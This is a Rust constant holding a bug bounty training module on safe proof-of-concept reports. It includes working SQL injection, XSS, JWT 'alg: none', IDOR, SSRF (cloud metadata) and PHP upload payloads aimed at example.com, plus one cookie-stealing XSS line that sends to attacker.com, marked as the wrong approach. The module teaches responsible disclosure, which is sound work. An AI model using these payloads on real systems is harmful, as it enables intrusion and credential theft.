// Proof-of-Concept Development - Bug Bounty Hunting Module
// Creating clear, reproducible proof-of-concept demonstrations


pub const PROOF_OF_CONCEPT_DEVELOPMENT_STEPS: &[(&str, &str)] = &[
    (
        "Proof-of-concept development",
        "OBJECTIVE: Create clear, reproducible proof-of-concept demonstrations that validate vulnerabilities without causing harm to production systems or accessing sensitive data.

ACADEMIC BACKGROUND:
NIST SP 800-115 Section 7.4 emphasizes safe exploitation techniques. ISO 29147 requires non-destructive proof-of-concept. Bugcrowd Vulnerability Rating Taxonomy (VRT) defines impact demonstration requirements. HackerOne Good Report Guide specifies PoC best practices.

STEP-BY-STEP PROCESS:

1. Safe PoC Development Principles:

Core Safety Rules:
```text
✓ DO: Demonstrate impact minimally
✓ DO: Use test accounts you created
✓ DO: Document every step clearly
✓ DO: Stop after proving vulnerability exists
✓ DO: Test in isolated/staging environments when possible

✗ DON'T: Access real customer data
✗ DON'T: Modify production databases
✗ DON'T: Delete or corrupt data
✗ DON'T: Chain exploits beyond necessary proof
✗ DON'T: Exfiltrate actual sensitive information
✗ DON'T: Test during peak business hours
✗ DON'T: Execute commands that could cause system instability
```

2. SQL Injection PoC:

Safe Demonstration:
```bash
# WRONG: Extracting entire database
sqlmap -u \"https://example.com/search?id=1\" --dump-all

# RIGHT: Prove vulnerability exists with minimal query
# Step 1: Identify injection point
curl \"https://example.com/search?id=1'\" 
# Error: \"You have an error in your SQL syntax\"

# Step 2: Confirm with basic payload
curl \"https://example.com/search?id=1' AND '1'='1\"
# Response: Normal content

curl \"https://example.com/search?id=1' AND '1'='2\"  
# Response: Empty or error (proves SQL execution)

# Step 3: Demonstrate impact with sleep
curl \"https://example.com/search?id=1' AND SLEEP(5)--\"
# Response time: 5+ seconds (proves command execution)

# Step 4: Extract version/database name ONLY
curl \"https://example.com/search?id=1' UNION SELECT @@version,database(),NULL--\"
# Response shows: MySQL 5.7.32, database: prod_db

# STOP HERE - Don't extract user tables, passwords, etc.
```

Report Format:
```text
TITLE: SQL Injection in Search Parameter

DESCRIPTION:
The search functionality at /search is vulnerable to SQL injection, allowing attackers to execute arbitrary SQL commands.

REPRODUCTION STEPS:
1. Visit https://example.com/search?id=1'
2. Observe SQL error message: \"You have an error in your SQL syntax near ''1'='1'\"

3. Confirm injection with: id=1' AND SLEEP(5)--
4. Response delays 5 seconds, confirming SQL execution
5. Database version extracted: MySQL 5.7.32

IMPACT: Attackers can extract entire database including user credentials, personal information, and payment data.

EVIDENCE: [Screenshot of SQL error, timing difference, version extraction]
```

3. XSS PoC Development:

Safe Payload Examples:
```bash
# Basic alert PoC
<script>alert(document.domain)</script>

# Proof of execution without theft
<script>alert('XSS PoC by [your_username] - PoC only')</script>

# Demonstrate cookie access (without stealing)
<script>alert('Cookies accessible: ' + document.cookie.substring(0,50))</script>

# WRONG: Actual cookie stealing
<script>fetch('https://attacker.com/?c='+document.cookie)</script>

# RIGHT: Log to console instead
<script>console.log('XSS PoC - Cookie:', document.cookie)</script>
```

Stored XSS PoC:
```text
REPRODUCTION STEPS:
1. Login to https://example.com/login with test account
2. Navigate to profile edit at /profile/edit
3. Enter payload in \"Bio\" field:
   <img src=x onerror=\"alert('XSS PoC by [username]')\">
4. Save profile
5. Visit public profile at /users/testuser
6. JavaScript executes, showing alert

IMPACT: Attackers can inject malicious scripts viewed by all users, enabling session hijacking, credential theft, and defacement.
```

4. Authentication Bypass PoC:

JWT Token Manipulation:
```bash
# Step 1: Obtain JWT token
curl -X POST https://example.com/api/login \\
  -H \"Content-Type: application/json\" \\
  -d '{\"username\":\"test@example.com\",\"password\":\"test123\"}'

# Response: {\"token\": \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\"}

# Step 2: Decode token (jwt.io or jwt-tool)
jwt-tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# Payload shows: {\"user_id\": 123, \"role\": \"user\"}

# Step 3: Test algorithm confusion attack
# Change \"alg\": \"HS256\" to \"alg\": \"none\"
# Remove signature
# Payload: {\"user_id\": 123, \"role\": \"admin\"}

# Step 4: Test with modified token
curl https://example.com/api/admin/users \\
  -H \"Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0...\"

# SUCCESS: Admin endpoint accessible with modified token
```

5. IDOR PoC:

Step-by-Step Documentation:
```text
TITLE: IDOR in User Profile Access

SETUP:
1. Create two test accounts:
   - Account A: test1@example.com (ID: 1001)
   - Account B: test2@example.com (ID: 1002)

REPRODUCTION:
1. Login as Account A
2. Access own profile: GET /api/users/1001/profile
   Response: {\"email\":\"test1@example.com\",\"name\":\"Test User 1\"}
   
3. Change user ID to 1002: GET /api/users/1002/profile
   Response: {\"email\":\"test2@example.com\",\"name\":\"Test User 2\"}
   
4. Successfully accessed Account B's data while authenticated as Account A

IMPACT: Any authenticated user can access/modify other users' profiles by changing the user ID parameter. Tested with accounts I created - real user data is at risk.

EVIDENCE: [Screenshots of requests/responses, Burp Suite history]
```

6. SSRF PoC:

Safe Internal Service Access:
```bash
# Test for SSRF in image upload/URL fetch
curl -X POST https://example.com/api/fetch-image \\
  -d \"url=http://127.0.0.1:80\"

# Response reveals internal service
# Status: 200, Content: Apache default page

# Test internal network access
curl -X POST https://example.com/api/fetch-image \\
  -d \"url=http://169.254.169.254/latest/meta-data/\"

# AWS metadata accessible - proves SSRF

# STOP HERE - Don't extract actual credentials
# Don't access http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Report:
```text
IMPACT: SSRF allows attackers to:
- Access internal services (databases, admin panels)
- Read AWS/GCP/Azure metadata (cloud credentials)
- Scan internal network
- Bypass IP whitelisting

DEMONSTRATED: Successfully accessed AWS metadata endpoint, confirming internal network accessibility.

RECOMMENDATION: Implement allowlist of accessible domains, validate and sanitize URLs, block access to internal IPs (127.0.0.1, 169.254.x.x, 10.x.x.x, 192.168.x.x).
```

7. File Upload PoC:

Safe Web Shell Demonstration:
```bash
# Create harmless test file
cat > test_poc.php << 'EOF'
<?php
// PoC by [your_username] - Bug Bounty Report #XXXXX
// This file only echoes text - no malicious operations
echo \"File upload vulnerability confirmed. PHP execution possible.\";
phpinfo(); // Show server info
?>
EOF

# Upload file
curl -F \"file=@test_poc.php\" https://example.com/upload

# Response: {\"url\": \"https://example.com/uploads/test_poc.php\"}

# Access uploaded file
curl https://example.com/uploads/test_poc.php

# Output shows phpinfo() - proves PHP execution

# CLEAN UP: Request removal of test file
# Contact security team to delete test_poc.php
```

8. Evidence Collection Best Practices:

Screenshots:
```text
✓ Include full browser window with URL bar
✓ Show timestamp (system clock, browser)
✓ Highlight relevant sections (red boxes/arrows)
✓ Capture before/after states
✓ Include error messages completely
✓ Show Burp Suite request/response
✓ Multiple screenshots for multi-step process

✗ Cropped images without context
✗ Missing URL or timestamp
✗ Blurry or low-resolution
✗ No annotations or highlights
```

HTTP Request/Response:
```bash
# Request
POST /api/search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123

query=test' OR '1'='1'--

# Response
HTTP/1.1 500 Internal Server Error

Error: You have an error in your SQL syntax near ''1'='1'--'
```

Video PoC (For Complex Issues):
```text
WHEN TO USE VIDEO:
- Multi-step reproduction
- Race conditions requiring timing
- Complex UI interactions
- Real-time demonstrations (XSS, clickjacking)

TOOLS:
- OBS Studio (free, cross-platform)
- Loom (quick browser recording)
- Asciinema (terminal recording)

VIDEO GUIDELINES:
- Keep under 3 minutes
- Show URL bar throughout
- Narrate steps clearly
- Upload to private YouTube/Vimeo
- Provide link in report
```

9. Reproducibility Testing:

Validation Checklist:
```bash
# Test PoC in different scenarios
1. Different browser (Chrome, Firefox, Safari)
2. Different user account (create second test account)
3. Incognito/private browsing mode
4. Different IP address (VPN, mobile network)
5. Different time of day (cache issues)

# Document reproduction rate
\"Reproduced successfully 5/5 attempts across Chrome and Firefox\"
\"Intermittent issue: reproduced 3/5 attempts (may be timing-dependent)\"
```

WHAT TO LOOK FOR:
- **Clear Reproduction Steps**: Anyone following steps should reach same result
- **Minimal Impact**: Prove vulnerability without causing damage
- **Complete Evidence**: Screenshots, HTTP traffic, video demonstrating issue
- **Isolated Testing**: Use test accounts, avoid real user data
- **Reproducibility**: Consistent results across different tests

SECURITY IMPLICATIONS:
- **Data Protection**: Never access actual customer data (PII, credentials, payment info)
- **Service Availability**: Avoid testing that could cause downtime or degradation
- **Legal Compliance**: PoC must stay within bug bounty program rules
- **Ethics**: Demonstrate minimum required to prove vulnerability

COMMON PITFALLS:
- **Destructive Testing**: Deleting data, dropping tables, creating admin accounts (unless explicitly allowed with rollback)
- **Data Exfiltration**: Downloading customer databases, stealing credentials
- **Incomplete Steps**: \"Change parameter and you'll see\" - missing exact payload and expected result
- **No Evidence**: Claims without screenshots or HTTP traffic
- **Over-Exploitation**: Chaining 5 vulnerabilities when 1 proves the point
- **Production Testing**: Testing payment flows with real transactions
- **Unclear Impact**: Not explaining business consequences of vulnerability
- **Complex PoCs**: Requiring special setup making triage difficult

TOOLS REFERENCE:
- **Burp Suite**: https://portswigger.net/burp (HTTP interception and testing)
- **JWT.io**: https://jwt.io/ (JWT token decoder)
- **jwt-tool**: https://github.com/ticarpi/jwt_tool (JWT analysis)
- **Postman**: https://www.postman.com/ (API testing and documentation)
- **OBS Studio**: https://obsproject.com/ (video recording)
- **Asciinema**: https://asciinema.org/ (terminal recording)

FURTHER READING:
- HackerOne Report Writing: https://docs.hackerone.com/en/articles/8518652-writing-a-good-report
- Bugcrowd VRT: https://bugcrowd.com/vulnerability-rating-taxonomy
- NIST SP 800-115 Section 7.4: https://csrc.nist.gov/publications/detail/sp/800-115/final"
    ),
];